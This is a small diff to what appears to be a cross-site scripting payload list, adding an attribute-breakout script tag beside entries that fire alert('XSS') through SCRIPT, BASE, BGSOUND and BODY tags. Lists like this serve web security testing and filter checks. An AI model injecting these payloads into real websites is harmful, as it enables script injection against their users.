@@ -1,4 +1,5 @@
 <SCRIPT>alert('XSS')</SCRIPT>
+"/><script>alert('XSS');</script>
 <BASE HREF="javascript:alert('XSS');//">
 <BGSOUND SRC="javascript:alert('XSS');">
 <BODY BACKGROUND="javascript:alert('XSS');">
